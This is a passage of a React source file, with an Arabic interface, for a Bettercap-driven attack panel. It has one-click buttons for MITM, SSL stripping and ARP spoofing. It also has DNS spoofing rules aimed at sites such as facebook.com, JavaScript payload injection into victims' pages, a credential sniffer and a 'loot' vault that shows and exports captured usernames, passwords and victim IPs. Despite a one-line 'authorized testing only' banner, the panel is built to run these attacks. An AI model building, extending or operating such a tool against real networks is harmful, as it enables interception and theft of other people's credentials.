"use client";
import { useState, useEffect, useCallback, useRef } from "react";
import { MODULE_INFO, JS_PAYLOADS, PLAYBOOKS, CMD_REFERENCE } from "@/lib/constants";

// ===================== TYPES =====================
interface StatusData {
  alive: boolean; my_ip: string | null; my_mac: string | null; interface_name: string | null;
  gateway: string | null; gateway_mac: string | null; modules: Record<string, boolean>;
  endpoints_count: number; events_count: number; uptime: number; error?: string;
}
interface Endpoint { ip: string; mac: string; hostname: string; vendor: string; sent: number; recv: number; }
interface EventItem { type: string; tag: string; time: string; data: Record<string, unknown>; }
interface LootItem { victimIp: string; website: string; username: string; password: string; protocol: string; time: string; }
interface DnsRule { domain: string; ip: string; }

// ===================== HELPERS =====================
const fmtBytes = (b: number) => { if (!b) return "0 B"; const k = 1024; const s = ["B", "KB", "MB", "GB"]; const i = Math.floor(Math.log(b) / Math.log(k)); return (b / Math.pow(k, i)).toFixed(1) + " " + s[i]; };
const fmtTime = (t: string) => { try { return new Date(t).toLocaleTimeString("ar-EG", { hour12: false }); } catch { return t; } };
const fmtUptime = (s: number) => { const h = Math.floor(s / 3600); const m = Math.floor((s % 3600) / 60); const sec = s % 60; return `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(sec).padStart(2, "0")}`; };
const dangerColor = (d: number) => d >= 3 ? "#ff3d71" : d >= 2 ? "#ffab00" : "#00ff66";

async function api(path: string, method = "GET", body?: unknown) {
  try {
    const opts: RequestInit = { method, headers: { "Content-Type": "application/json" } };
    if (body) opts.body = JSON.stringify(body);
    const res = await fetch(`/api/${path}`, opts);
    return await res.json();
  } catch { return { error: "Connection failed" }; }
}

// ===================== MAIN =====================
export default function App() {
  const [tab, setTab] = useState("dashboard");
  const [status, setStatus] = useState<StatusData | null>(null);
  const [endpoints, setEndpoints] = useState<Endpoint[]>([]);
  const [events, setEvents] = useState<EventItem[]>([]);
  const [loot, setLoot] = useState<LootItem[]>([]);
  const [targets, setTargets] = useState<Set<string>>(new Set());
  const [modal, setModal] = useState<{ title: string; text: string; onOk: () => void } | null>(null);
  const [moduleInfo, setModuleInfo] = useState<string | null>(null);
  const [consoleLog, setConsoleLog] = useState<Array<{ cmd: string; out: string }>>([]);
  const [cmdInput, setCmdInput] = useState("");
  const cmdHistory = useRef<string[]>([]);
  const [cmdIdx, setCmdIdx] = useState(-1);
  const [openSections, setOpenSections] = useState<Set<number>>(new Set([0]));
  const [loading, setLoading] = useState<Record<string, boolean>>({});
  const [dnsRules, setDnsRules] = useState<DnsRule[]>([{ domain: "", ip: "" }]);
  const [sniffOpts, setSniffOpts] = useState({ credentialsOnly: false, httpOnly: false, dnsOnly: false, ignoreLocal: true, customFilter: "", targetIp: "" });
  const [playbookDomain, setPlaybookDomain] = useState("*");
  const [playbookRedirectIp, setPlaybookRedirectIp] = useState("");
  const [notification, setNotification] = useState<string | null>(null);
  const consoleRef = useRef<HTMLDivElement>(null);
  const prevEndpointCount = useRef(0);

  const showNotif = (msg: string) => { setNotification(msg); setTimeout(() => setNotification(null), 4000); };

  // ---- FETCHERS ----
  const fetchStatus = useCallback(async () => {
    const d = await api("status"); setStatus(d);
  }, []);
  const fetchEndpoints = useCallback(async () => {
    const d = await api("endpoints");
    const eps = d.endpoints || [];
    if (eps.length > prevEndpointCount.current && prevEndpointCount.current > 0) {
      const newOnes = eps.slice(prevEndpointCount.current);
      if (newOnes.length > 0) showNotif(`🆕 جهاز جديد: ${newOnes[newOnes.length - 1]?.hostname || newOnes[newOnes.length - 1]?.ip}`);
    }
    prevEndpointCount.current = eps.length;
    setEndpoints(eps);
  }, []);
  const fetchEvents = useCallback(async () => { const d = await api("events"); setEvents(d.events || []); }, []);
  const fetchLoot = useCallback(async () => { const d = await api("loot"); setLoot(d.data?.loot || []); }, []);

  useEffect(() => {
    fetchStatus(); fetchEndpoints(); fetchEvents(); fetchLoot();
    const iv = setInterval(() => {
      fetchStatus();
      if (tab === "network") fetchEndpoints();
      if (tab === "feed" || tab === "dashboard") fetchEvents();
      if (tab === "loot") fetchLoot();
    }, 2500);
    return () => clearInterval(iv);
  }, [tab, fetchStatus, fetchEndpoints, fetchEvents, fetchLoot]);

  // ---- ACTIONS ----
  const withLoading = async (key: string, fn: () => Promise<void>) => {
    setLoading(p => ({ ...p, [key]: true }));
    await fn();
    setLoading(p => ({ ...p, [key]: false }));
  };

  const confirm = (title: string, text: string, onOk: () => void) => setModal({ title, text, onOk });

  const runCmd = async (cmd: string) => {
    if (!cmd.trim()) return;
    cmdHistory.current.push(cmd);
    setCmdIdx(-1);
    const d = await api("raw", "POST", { command: cmd });
    setConsoleLog(p => [...p, { cmd, out: d.output || d.error || "OK" }]);
    setCmdInput("");
    setTimeout(() => consoleRef.current?.scrollTo(0, consoleRef.current.scrollHeight), 50);
  };

  const toggleTarget = (ip: string) => setTargets(p => { const s = new Set(p); s.has(ip) ? s.delete(ip) : s.add(ip); return s; });

  const toggleMod = async (name: string, state: boolean) => {
    await withLoading(name, async () => { await api("toggle", "POST", { module: name, state }); await fetchStatus(); });
  };

  // ===================== TABS =====================
  const renderDashboard = () => (
    <div className="animate-fade space-y-3 p-4">
      {/* Warning */}
      <div className="flex items-center gap-2 rounded-xl border border-[#ffab00] bg-gradient-to-l from-[#ffab0015] to-[#ff3d7115] p-3 text-xs">
        <span className="text-lg">⚠️</span>
        <span className="text-[#ffab00]">للاختبار المصرح به فقط — أنت مسؤول عن أفعالك قانونياً</span>
      </div>
      {/* Status Cards */}
      <div className="grid grid-cols-3 gap-2">
        {[
          { label: "عنواني", val: status?.my_ip || "---", color: "#00d4ff" },
          { label: "الراوتر", val: status?.gateway || "---", color: "#00ff66" },
          { label: "التشغيل", val: fmtUptime(status?.uptime || 0), color: "#bf5af2" },
          { label: "الأجهزة", val: String(status?.endpoints_count || 0), color: "#ffab00" },
          { label: "الأهداف", val: String(targets.size), color: "#ff3d71" },
          { label: "الأحداث", val: String(status?.events_count || 0), color: "#00d4ff" },
        ].map((c, i) => (
          <div key={i} className="rounded-xl border border-[#2a3654] bg-[#121829] p-3">
            <div className="text-[10px] text-gray-500">{c.label}</div>
            <div className="mt-1 truncate text-sm font-bold" style={{ color: c.color }}>{c.val}</div>
          </div>
        ))}
      </div>
      {/* Connection */}
      <div className="flex items-center justify-between rounded-xl border border-[#2a3654] bg-[#121829] p-3">
        <span className="text-sm font-medium">حالة Bettercap</span>
        <span className={`flex items-center gap-2 rounded-full px-3 py-1 text-xs font-medium ${status?.alive ? "bg-[#00ff6620] text-[#00ff66]" : "bg-[#ff3d7120] text-[#ff3d71]"}`}>
          <span className={`h-2 w-2 rounded-full animate-pulse ${status?.alive ? "bg-[#00ff66]" : "bg-[#ff3d71]"}`} />
          {status?.alive ? "متصل" : "غير متصل"}
        </span>
      </div>
      {status?.error && <div className="rounded-lg bg-[#ff3d7115] p-2 text-xs text-[#ff3d71]">{status.error}</div>}
      {/* Module Badges */}
      <div className="rounded-xl border border-[#2a3654] bg-[#121829] p-3">
        <div className="mb-2 text-xs font-medium text-gray-400">الوحدات النشطة</div>
        <div className="flex flex-wrap gap-1">
          {Object.entries(status?.modules || {}).map(([n, r]) => (
            <span key={n} className={`rounded-full px-2 py-0.5 text-[10px] font-medium ${r ? "bg-[#00ff6618] text-[#00ff66]" : "bg-[#ffffff08] text-gray-600"}`}>
              {r ? "●" : "○"} {n}
            </span>
          ))}
        </div>
      </div>
      {/* Quick Actions */}
      <div className="grid grid-cols-2 gap-2">
        <button onClick={() => confirm("استكشاف", "بدء استكشاف الشبكة؟", async () => { setModal(null); await withLoading("recon", async () => { await api("probe", "POST"); await fetchStatus(); }); })} disabled={loading.recon} className="flex items-center justify-center gap-2 rounded-xl bg-gradient-to-l from-[#00d4ff] to-[#0099cc] p-3 text-sm font-medium text-white active:scale-95 disabled:opacity-50">
          {loading.recon ? "⏳" : "🔍"} استكشاف
        </button>
        <button onClick={() => confirm("⚠️ MITM", "بدء هجوم MITM على الأهداف المحددة؟", async () => { setModal(null); await withLoading("mitm", async () => { await api("mitm_start", "POST", { targets: [...targets] }); await fetchStatus(); }); })} disabled={loading.mitm} className="flex items-center justify-center gap-2 rounded-xl bg-gradient-to-l from-[#ffab00] to-[#cc8800] p-3 text-sm font-medium text-black active:scale-95 disabled:opacity-50">
          {loading.mitm ? "⏳" : "🎭"} MITM
        </button>
        <button onClick={() => confirm("SSL Strip", "تفعيل تجريد SSL؟", async () => { setModal(null); await withLoading("ssl", async () => { await api("sslstrip_on", "POST"); await fetchStatus(); }); })} disabled={loading.ssl} className="flex items-center justify-center gap-2 rounded-xl border border-[#2a3654] bg-[#1e2740] p-3 text-sm font-medium active:scale-95 disabled:opacity-50">
          {loading.ssl ? "⏳" : "🔓"} SSL Strip
        </button>
        <button onClick={async () => { await withLoading("stop", async () => { await api("stopall", "POST"); await fetchStatus(); showNotif("⏹️ تم إيقاف الكل"); }); }} disabled={loading.stop} className="flex items-center justify-center gap-2 rounded-xl bg-gradient-to-l from-[#ff3d71] to-[#cc2255] p-3 text-sm font-medium text-white active:scale-95 disabled:opacity-50">
          {loading.stop ? "⏳" : "⏹️"} إيقاف الكل
        </button>
      </div>
      {/* Recent Events */}
      <div className="rounded-xl border border-[#2a3654] bg-[#121829] p-3">
        <div className="mb-2 text-xs font-medium text-gray-400">آخر الأحداث</div>
        <div className="max-h-40 space-y-1 overflow-y-auto">
          {events.slice(0, 6).map((e, i) => (
            <div key={i} className={`rounded-lg p-2 text-[11px] ${e.type === "cred" ? "border-r-2 border-[#ff3d71] bg-[#ff3d7110]" : e.type === "http" ? "border-r-2 border-[#00d4ff] bg-[#00d4ff08]" : e.type === "dns" ? "border-r-2 border-[#bf5af2] bg-[#bf5af208]" : "border-r-2 border-[#00ff66] bg-[#00ff6608]"}`}>
              <span className="text-gray-500">{fmtTime(e.time)}</span>
              <span className="mx-1 font-medium" style={{ color: e.type === "cred" ? "#ff3d71" : e.type === "http" ? "#00d4ff" : e.type === "dns" ? "#bf5af2" : "#00ff66" }}>{e.tag}</span>
              {e.type === "cred" && <span className="text-[#ff3d71]">🔑 {String(e.data.username || "")}</span>}
            </div>
          ))}
          {events.length === 0 && <div className="py-4 text-center text-xs text-gray-600">لا توجد أحداث</div>}
        </div>
      </div>
    </div>
  );

  const renderNetwork = () => (
    <div className="animate-fade space-y-3 p-4">
      <div className="flex gap-2">
        <button onClick={async () => { await withLoading("recon", async () => { await api("probe", "POST"); await fetchEndpoints(); await fetchStatus(); }); }} className="flex-1 rounded-xl bg-gradient-to-l from-[#00d4ff] to-[#0099cc] p-3 text-sm font-medium text-white active:scale-95">{loading.recon ? "⏳" : "🔍"} استكشاف</button>
        <button onClick={() => setTargets(new Set(endpoints.map(e => e.ip)))} className="rounded-xl border border-[#2a3654] bg-[#1e2740] px-4 py-3 text-xs active:scale-95">الكل</button>
        <button onClick={() => setTargets(new Set())} className="rounded-xl border border-[#2a3654] bg-[#1e2740] px-4 py-3 text-xs active:scale-95">إلغاء</button>
      </div>
      {targets.size > 0 && (
        <div className="flex items-center justify-between rounded-lg bg-[#ffab0015] p-2 text-xs text-[#ffab00]">
          <span>✅ تم تحديد {targets.size} جهاز</span>
          <button onClick={async () => { await api("smart/target", "POST", { targets: [...targets] }); showNotif("تم تحديث الأهداف"); }} className="rounded-lg bg-[#ffab00] px-3 py-1 text-[10px] font-medium text-black">تطبيق الاستهداف</button>
        </div>
      )}
      <div className="overflow-x-auto rounded-xl border border-[#2a3654] bg-[#121829]">
        <table className="w-full text-xs">
          <thead><tr className="border-b border-[#2a3654] bg-[#1e2740] text-[10px] text-gray-500">
            <th className="p-2 w-8"></th><th className="p-2 text-right">IP</th><th className="p-2 text-right">MAC</th><th className="hidden p-2 text-right sm:table-cell">الاسم</th><th className="hidden p-2 text-right sm:table-cell">المصنع</th><th className="p-2 text-right">البيانات</th>
          </tr></thead>
          <tbody>
            {endpoints.map(ep => (
              <tr key={ep.ip} className={`border-b border-[#2a365450] ${targets.has(ep.ip) ? "bg-[#00d4ff08]" : ""}`}>
                <td className="p-2"><div onClick={() => toggleTarget(ep.ip)} className={`flex h-5 w-5 cursor-pointer items-center justify-center rounded border-2 text-[10px] font-bold ${targets.has(ep.ip) ? "border-[#00d4ff] bg-[#00d4ff] text-black" : "border-[#2a3654]"}`}>{targets.has(ep.ip) ? "✓" : ""}</div></td>
                <td className="p-2 font-mono text-[#00d4ff]">{ep.ip}</td>
                <td className="p-2 font-mono text-[10px] text-gray-500">{ep.mac}</td>
                <td className="hidden p-2 text-gray-400 sm:table-cell">{ep.hostname || "—"}</td>
                <td className="hidden p-2 text-[10px] text-gray-500 sm:table-cell">{ep.vendor}</td>
                <td className="p-2 text-[10px]"><span className="text-[#00ff66]">↑{fmtBytes(ep.sent)}</span> <span className="text-[#00d4ff]">↓{fmtBytes(ep.recv)}</span></td>
              </tr>
            ))}
          </tbody>
        </table>
        {endpoints.length === 0 && <div className="py-8 text-center text-xs text-gray-600">لا توجد أجهزة — ابدأ الاستكشاف</div>}
      </div>
    </div>
  );

  const renderTools = () => (
    <div className="animate-fade space-y-2 p-4">
      {Object.entries(MODULE_INFO).map(([name, info]) => {
        const running = status?.modules?.[name] ?? false;
        return (
          <div key={name} className={`rounded-xl border bg-[#121829] p-3 ${running ? "border-[#00ff6640]" : "border-[#2a3654]"}`}>
            <div className="flex items-center gap-3">
              <span className="text-xl">{info.icon}</span>
              <div className="flex-1">
                <div className="text-sm font-medium">{info.name}</div>
                <div className="text-[10px] text-gray-500">{info.desc}</div>
              </div>
              <button onClick={() => setModuleInfo(name)} className="mr-1 text-gray-500 active:text-white">ℹ️</button>
              <button disabled={!!loading[name]} onClick={() => confirm(running ? "إيقاف" : "تشغيل", `${running ? "إيقاف" : "تشغيل"} ${info.name}؟`, () => { setModal(null); toggleMod(name, !running); })}
                className={`relative h-7 w-[52px] rounded-full transition-colors ${running ? "bg-[#00ff66]" : "bg-[#1e2740]"} ${loading[name] ? "opacity-50" : ""}`}>
                <div className={`absolute top-[2px] h-[24px] w-[24px] rounded-full bg-white shadow transition-all ${running ? "right-[2px]" : "right-[26px]"}`} />
              </button>
            </div>
            {info.warning && running && <div className="mt-2 rounded-lg bg-[#ffab0015] p-1.5 text-[10px] text-[#ffab00]">{info.warning}</div>}
          </div>
        );
      })}
    </div>
  );

  const renderPlaybooks = () => (
    <div className="animate-fade space-y-3 p-4">
      <div className="text-xs text-gray-500">سيناريوهات هجوم جاهزة — ضغطة واحدة لتنفيذ سلسلة أوامر كاملة</div>
      {PLAYBOOKS.map(pb => (
        <div key={pb.id} className="rounded-xl border border-[#2a3654] bg-[#121829] p-4">
          <div className="flex items-center gap-3">
            <span className="text-2xl">{pb.icon}</span>
            <div className="flex-1">
              <div className="text-sm font-bold">{pb.name}</div>
              <div className="text-[11px] text-gray-400">{pb.desc}</div>
            </div>
            <div className="flex items-center gap-1">
              {[1, 2, 3].map(i => (<span key={i} className="text-[10px]" style={{ color: i <= pb.danger ? dangerColor(pb.danger) : "#333" }}>●</span>))}
            </div>
          </div>
          <div className="mt-3 space-y-1">
            {pb.steps.map((s, i) => (<div key={i} className="rounded bg-[#1e2740] px-2 py-1 font-mono text-[10px] text-[#00d4ff]" dir="ltr">{i + 1}. {s}</div>))}
          </div>
          {pb.id === "dns_hijack" && (
            <div className="mt-3 space-y-2">
              <input value={playbookDomain} onChange={e => setPlaybookDomain(e.target.value)} placeholder="النطاق مثل *.facebook.com" className="w-full rounded-lg border border-[#2a3654] bg-[#1e2740] p-2 text-xs text-white outline-none" dir="ltr" />
              <input value={playbookRedirectIp} onChange={e => setPlaybookRedirectIp(e.target.value)} placeholder="IP التوجيه" className="w-full rounded-lg border border-[#2a3654] bg-[#1e2740] p-2 text-xs text-white outline-none" dir="ltr" />
            </div>
          )}
          <button disabled={!!loading[pb.id]} onClick={() => confirm(`⚠️ ${pb.name}`, `تنفيذ ${pb.name}؟ خطورة: ${"●".repeat(pb.danger)}`, async () => {
            setModal(null);
            await withLoading(pb.id, async () => {
              await api("playbook", "POST", { playbook: pb.id, targets: [...targets], domain: playbookDomain, redirectIp: playbookRedirectIp });
              await fetchStatus();
              showNotif(`✅ تم تفعيل: ${pb.name}`);
            });
          })} className="mt-3 w-full rounded-xl p-3 text-sm font-medium text-white active:scale-95" style={{ background: `linear-gradient(135deg, ${dangerColor(pb.danger)}cc, ${dangerColor(pb.danger)}88)` }}>
            {loading[pb.id] ? "⏳ جارٍ..." : `▶️ تنفيذ ${pb.name}`}
          </button>
        </div>
      ))}
    </div>
  );

  const renderSmartSet = () => (
    <div className="animate-fade space-y-4 p-4">
      {/* DNS Spoofing */}
      <div className="rounded-xl border border-[#2a3654] bg-[#121829] p-4">
        <div className="mb-3 flex items-center gap-2 text-sm font-bold"><span>📛</span> تزييف DNS الذكي</div>
        <div className="text-[11px] text-gray-500 mb-3">أضف قواعد لتوجيه النطاقات إلى عناوين مزيفة</div>
        {dnsRules.map((rule, i) => (
          <div key={i} className="mb-2 flex gap-2">
            <input value={rule.domain} onChange={e => { const r = [...dnsRules]; r[i] = { ...r[i], domain: e.target.value }; setDnsRules(r); }} placeholder="*.facebook.com" className="flex-1 rounded-lg border border-[#2a3654] bg-[#1e2740] p-2 text-xs text-white outline-none focus:border-[#00d4ff]" dir="ltr" />
            <input value={rule.ip} onChange={e => { const r = [...dnsRules]; r[i] = { ...r[i], ip: e.target.value }; setDnsRules(r); }} placeholder="192.168.1.37" className="w-32 rounded-lg border border-[#2a3654] bg-[#1e2740] p-2 text-xs text-white outline-none focus:border-[#00d4ff]" dir="ltr" />
            <button onClick={() => setDnsRules(dnsRules.filter((_, j) => j !== i))} className="text-[#ff3d71] text-lg px-1">✕</button>
          </div>
        ))}
        <button onClick={() => setDnsRules([...dnsRules, { domain: "", ip: "" }])} className="mb-3 text-xs text-[#00d4ff]">+ إضافة قاعدة</button>
        <button disabled={!!loading.dns} onClick={async () => {
          const valid = dnsRules.filter(r => r.domain && r.ip);
          if (!valid.length) return;
          await withLoading("dns", async () => { await api("smart/dns", "POST", { rules: valid }); await fetchStatus(); showNotif(`✅ تزييف ${valid.length} نطاق`); });
        }} className="w-full rounded-xl bg-gradient-to-l from-[#bf5af2] to-[#9933cc] p-3 text-sm font-medium text-white active:scale-95">{loading.dns ? "⏳" : "📛"} تفعيل تزييف DNS</button>
      </div>

      {/* JS Injection */}
      <div className="rounded-xl border border-[#2a3654] bg-[#121829] p-4">
        <div className="mb-3 flex items-center gap-2 text-sm font-bold"><span>💉</span> حقن JavaScript</div>
        <div className="text-[11px] text-gray-500 mb-3">اختر Payload ليتم حقنه في صفحات HTTP</div>
        <div className="grid grid-cols-2 gap-2">
          {Object.entries(JS_PAYLOADS).map(([key, pl]) => (
            <button key={key} disabled={!!loading[`inject_${key}`]} onClick={() => confirm(`💉 ${pl.name}`, `حقن ${pl.name}؟ خطورة: ${"●".repeat(pl.danger)}`, async () => {
              setModal(null);
              await withLoading(`inject_${key}`, async () => { await api("smart/inject", "POST", { payload: key }); await fetchStatus(); showNotif(`✅ تم حقن: ${pl.name}`); });
            })} className="rounded-xl border border-[#2a3654] bg-[#1e2740] p-3 text-right active:scale-95">
              <div className="text-lg">{pl.icon}</div>
              <div className="mt-1 text-xs font-medium">{pl.name}</div>
              <div className="text-[10px] text-gray-500">{pl.desc}</div>
              <div className="mt-1 flex gap-0.5">{[1, 2, 3].map(i => <span key={i} style={{ color: i <= pl.danger ? dangerColor(pl.danger) : "#333" }} className="text-[8px]">●</span>)}</div>
            </button>
          ))}
        </div>
      </div>

      {/* Smart Sniff */}
      <div className="rounded-xl border border-[#2a3654] bg-[#121829] p-4">
        <div className="mb-3 flex items-center gap-2 text-sm font-bold"><span>👂</span> فلترة التنصت الذكية</div>
        <div className="space-y-2">
          {[
            { key: "credentialsOnly" as const, label: "كلمات المرور فقط", icon: "🔑" },
            { key: "httpOnly" as const, label: "HTTP فقط", icon: "🌐" },
            { key: "dnsOnly" as const, label: "DNS فقط", icon: "📛" },
            { key: "ignoreLocal" as const, label: "تجاهل المحلي", icon: "🚫" },
          ].map(opt => (
            <div key={opt.key} className="flex items-center justify-between rounded-lg bg-[#1e2740] p-2">
              <span className="text-xs">{opt.icon} {opt.label}</span>
              <button onClick={() => setSniffOpts(p => ({ ...p, [opt.key]: !p[opt.key] }))}
                className={`relative h-6 w-11 rounded-full transition-colors ${sniffOpts[opt.key] ? "bg-[#00d4ff]" : "bg-[#2a3654]"}`}>
                <div className={`absolute top-[2px] h-[20px] w-[20px] rounded-full bg-white shadow transition-all ${sniffOpts[opt.key] ? "right-[2px]" : "right-[22px]"}`} />
              </button>
            </div>
          ))}
          <input value={sniffOpts.targetIp} onChange={e => setSniffOpts(p => ({ ...p, targetIp: e.target.value }))} placeholder="فلتر IP معين (اختياري)" className="w-full rounded-lg border border-[#2a3654] bg-[#1e2740] p-2 text-xs text-white outline-none" dir="ltr" />
          <input value={sniffOpts.customFilter} onChange={e => setSniffOpts(p => ({ ...p, customFilter: e.target.value }))} placeholder="BPF Filter مخصص (اختياري)" className="w-full rounded-lg border border-[#2a3654] bg-[#1e2740] p-2 text-xs text-white outline-none" dir="ltr" />
        </div>
        <button disabled={!!loading.sniff} onClick={async () => {
          await withLoading("sniff", async () => { await api("smart/sniff", "POST", sniffOpts); await fetchStatus(); showNotif("✅ تم تفعيل التنصت"); });
        }} className="mt-3 w-full rounded-xl bg-gradient-to-l from-[#00d4ff] to-[#0066aa] p-3 text-sm font-medium text-white active:scale-95">{loading.sniff ? "⏳" : "👂"} تفعيل التنصت</button>
      </div>
    </div>
  );

  const renderFeed = () => (
    <div className="animate-fade space-y-3 p-4">
      <div className="flex gap-2">
        <button onClick={async () => { await api("clear", "POST"); setEvents([]); }} className="flex-1 rounded-xl border border-[#2a3654] bg-[#1e2740] p-2.5 text-xs active:scale-95">🗑️ مسح</button>
        <button onClick={() => {
          const d = JSON.stringify(events, null, 2);
          const b = new Blob([d], { type: "application/json" });
          const u = URL.createObjectURL(b); const a = document.createElement("a"); a.href = u; a.download = "events.json"; a.click();
        }} className="flex-1 rounded-xl border border-[#2a3654] bg-[#1e2740] p-2.5 text-xs active:scale-95">📥 تصدير</button>
      </div>
      <div className="max-h-[calc(100vh-230px)] space-y-2 overflow-y-auto">
        {events.map((e, i) => (
          <div key={i} className={`rounded-xl border-r-[3px] bg-[#121829] p-3 ${e.type === "cred" ? "border-[#ff3d71] bg-[#ff3d7108]" : e.type === "http" ? "border-[#00d4ff]" : e.type === "dns" ? "border-[#bf5af2]" : "border-[#00ff66]"}`}>
            <div className="flex items-start justify-between">
              <span className="text-xs font-semibold" style={{ color: e.type === "cred" ? "#ff3d71" : e.type === "http" ? "#00d4ff" : e.type === "dns" ? "#bf5af2" : "#00ff66" }}>
                {e.type === "cred" ? "🔑" : e.type === "http" ? "🌐" : e.type === "dns" ? "📛" : "📡"} {e.tag}
              </span>
              <span className="text-[10px] text-gray-600">{fmtTime(e.time)}</span>
            </div>
            {e.type === "cred" && (
              <div className="mt-2 rounded-lg bg-[#ff3d7115] p-2">
                <div className="text-xs text-[#ff3d71]">👤 {String(e.data.username || "—")}</div>
                <div className="text-xs text-[#ff3d71]">🔑 {String(e.data.password || "—")}</div>
                <div className="text-[10px] text-gray-500">من: {String(e.data.from || "—")} → {String(e.data.to || "—")}</div>
              </div>
            )}
            {e.type !== "cred" && <pre className="mt-1 overflow-x-auto text-[10px] text-gray-500" dir="ltr">{JSON.stringify(e.data, null, 1).slice(0, 200)}</pre>}
          </div>
        ))}
        {events.length === 0 && <div className="py-12 text-center text-xs text-gray-600">لا توجد أحداث — شغّل المتنصت</div>}
      </div>
    </div>
  );

  const renderLoot = () => (
    <div className="animate-fade space-y-3 p-4">
      <div className="flex items-center justify-between">
        <div className="text-sm font-bold text-[#ff3d71]">🔑 خزنة كلمات المرور</div>
        <span className="rounded-full bg-[#ff3d7120] px-2 py-0.5 text-xs text-[#ff3d71]">{loot.length} صيد</span>
      </div>
      {loot.length === 0 && <div className="rounded-xl border border-[#2a3654] bg-[#121829] py-12 text-center text-xs text-gray-600">لا توجد كلمات مرور ملتقطة بعد<br />فعّل سيناريو &quot;حصد كلمات المرور&quot; للبدء</div>}
      {loot.map((l, i) => (
        <div key={i} className="animate-slide rounded-xl border border-[#ff3d7130] bg-[#121829] p-4">
          <div className="flex items-center justify-between">
            <span className="text-lg">🔐</span>
            <span className="rounded-full bg-[#ff3d7120] px-2 py-0.5 text-[10px] text-[#ff3d71]">{l.protocol}</span>
          </div>
          <div className="mt-2 space-y-1">
            <div className="flex justify-between text-xs"><span className="text-gray-500">الموقع</span><span className="font-mono text-[#00d4ff]">{l.website}</span></div>
            <div className="flex justify-between text-xs"><span className="text-gray-500">المستخدم</span><span className="font-mono text-[#ffab00]">{l.username}</span></div>
            <div className="flex justify-between text-xs"><span className="text-gray-500">كلمة المرور</span><span className="font-mono text-[#ff3d71]">{l.password}</span></div>
            <div className="flex justify-between text-xs"><span className="text-gray-500">IP الضحية</span><span className="font-mono text-gray-400">{l.victimIp}</span></div>
            <div className="flex justify-between text-xs"><span className="text-gray-500">الوقت</span><span className="text-gray-400">{fmtTime(l.time)}</span></div>
          </div>
        </div>
      ))}
      {loot.length > 0 && (
        <button onClick={() => {
          const txt = loot.map(l => `[${l.protocol}] ${l.website} | ${l.username}:${l.password} | IP: ${l.victimIp}`).join("\n");
          const b = new Blob([txt], { type: "text/plain" }); const u = URL.createObjectURL(b);
          const a = document.createElement("a"); a.href = u; a.download = "loot.txt"; a.click();
        }} className="w-full rounded-xl bg-gradient-to-l from-[#ff3d71] to-[#cc2255] p-3 text-sm font-medium text-white active:scale-95">📥 تصدير كل الصيد</button>
      )}
    </div>
  );

  const renderConsole = () => (
    <div className="animate-fade space-y-3 p-4">
      <div className="flex flex-wrap gap-1.5">
        {["net.show", "get *", "arp.spoof on", "arp.spoof off", "events.clear", "help"].map(c => (
          <button key={c} onClick={() => runCmd(c)} className="rounded-lg border border-[#2a3654] bg-[#1e2740] px-2.5 py-1.5 text-[10px] font-mono active:scale-95">{c}</button>
        ))}
      </div>
      <div ref={consoleRef} className="h-56 overflow-y-auto rounded-xl bg-black/60 p-3 font-mono text-xs">
        {consoleLog.map((e, i) => (
          <div key={i} className="mb-2">
            <div className="text-[#00ff66]">&gt; {e.cmd}</div>
            <div className="whitespace-pre-wrap text-gray-400">{e.out}</div>
          </div>
        ))}
        {consoleLog.length === 0 && <div className="text-gray-600">أدخل أوامر Bettercap هنا...</div>}
      </div>
      <div className="flex gap-2">
        <input value={cmdInput} onChange={e => setCmdInput(e.target.value)}
          onKeyDown={e => {
            if (e.key === "Enter") runCmd(cmdInput);
            else if (e.key === "ArrowUp") { e.preventDefault(); if (cmdHistory.current.length) { const ni = cmdIdx === -1 ? cmdHistory.current.length - 1 : Math.max(0, cmdIdx - 1); setCmdIdx(ni); setCmdInput(cmdHistory.current[ni]); } }
            else if (e.key === "ArrowDown") { e.preventDefault(); if (cmdIdx !== -1) { const ni = cmdIdx + 1; if (ni >= cmdHistory.current.length) { setCmdIdx(-1); setCmdInput(""); } else { setCmdIdx(ni); setCmdInput(cmdHistory.current[ni]); } } }
          }}
          placeholder="أدخل أمر Bettercap..." className="flex-1 rounded-xl border border-[#2a3654] bg-[#1e2740] p-3 font-mono text-xs text-white outline-none focus:border-[#00d4ff]" dir="ltr" />
        <button onClick={() => runCmd(cmdInput)} className="rounded-xl bg-gradient-to-l from-[#00d4ff] to-[#0099cc] px-5 text-sm font-medium text-white active:scale-95">⏎</button>
      </div>
    </div>
  );

  const renderReference = () => (
    <div className="animate-fade space-y-2 p-4">
      {CMD_REFERENCE.map((cat, ci) => (
        <div key={ci} className="overflow-hidden rounded-xl border border-[#2a3654] bg-[#121829]">
          <button onClick={() => setOpenSections(p => { const s = new Set(p); s.has(ci) ? s.delete(ci) : s.add(ci); return s; })}
            className="flex w-full items-center justify-between p-3 text-right">
            <span className="flex items-center gap-2 text-sm font-medium"><span>{cat.icon}</span>{cat.cat}</span>
            <span className={`transition-transform ${openSections.has(ci) ? "rotate-180" : ""}`}>▼</span>
          </button>
          <div className={`overflow-hidden transition-all duration-300 ${openSections.has(ci) ? "max-h-[600px]" : "max-h-0"}`}>
            <div className="space-y-1 p-2 pt-0">
              {cat.cmds.map((c, i) => (
                <div key={i} className="flex items-center justify-between rounded-lg bg-[#1e2740] p-2">
                  <div className="flex-1">
                    <div className="font-mono text-[11px] text-[#00d4ff]" dir="ltr">{c.cmd}</div>
                    <div className="text-[10px] text-gray-500">{c.desc}</div>
                  </div>
                  <button onClick={() => { if (c.cmd.includes("<")) { setCmdInput(c.cmd); setTab("console"); } else runCmd(c.cmd); }}
                    className="mr-2 rounded-lg border border-[#2a3654] bg-[#0a0e1a] px-2 py-1 text-[10px] active:scale-95">تنفيذ</button>
                </div>
              ))}
            </div>
          </div>
        </div>
      ))}
    </div>
  );

  // ===================== LAYOUT =====================
  const TABS = [
    { id: "dashboard", icon: "⬡", label: "الرئيسية" },
    { id: "network", icon: "⊛", label: "الشبكة" },
    { id: "tools", icon: "⚙", label: "الأدوات" },
    { id: "playbooks", icon: "🎯", label: "سيناريوهات" },
    { id: "smartset", icon: "⚡", label: "ذكي" },
    { id: "feed", icon: "◉", label: "البث" },
    { id: "loot", icon: "🔑", label: "الصيد" },
    { id: "console", icon: "▸", label: "أوامر" },
    { id: "reference", icon: "📖", label: "دليل" },
  ];

  return (
    <div className="min-h-screen bg-[#0a0e1a] text-white pb-20">
      {/* Header */}
      <header className="sticky top-0 z-50 flex items-center justify-between border-b border-[#2a3654] bg-[#121829]/95 px-4 py-3 backdrop-blur-sm">
